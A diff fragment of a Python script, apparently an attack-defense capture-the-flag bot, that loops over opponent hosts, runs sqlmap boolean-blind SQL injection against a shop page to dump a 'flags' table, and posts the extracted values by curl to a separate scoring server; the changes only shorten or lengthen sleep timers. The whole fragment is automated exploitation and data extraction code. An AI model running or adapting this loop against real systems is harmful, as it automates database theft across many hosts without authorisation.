@@ -9,7 +9,7 @@ while True:
             continue
         try:
             p = subprocess.Popen(f"""python3 /home/ubuntu/sqlmap-dev/sqlmap.py -u "http://10.254.{i}.2:4001/index.php?page=shop&type=VGA" --technique=B -D vstore -T flags --dump --batch > temp_web{i}.txt""", shell=True)
-            sleep(5)            
+            sleep(20)            
             with open(f"temp_web{i}.txt","r") as f:
                 data=[]
                 for line in f:
@@ -18,7 +18,7 @@ while True:
                 flag.append(data[-8])
         except:
             print("error get flag")
-            sleep(5) 
+            sleep(2) 
 
 
     for line in flag:
@@ -32,8 +32,8 @@ while True:
                         f"""'["{line}"]' 'http://10.254.0.253:8080/flags' """
                 print(cmd_query)
                 p = subprocess.Popen(cmd_query, shell=True)
-                sleep(5)
+                sleep(2)
         except:
             print("error curl")
-            sleep(5) 
-    sleep(120)
+            sleep(1) 
+    sleep(10)
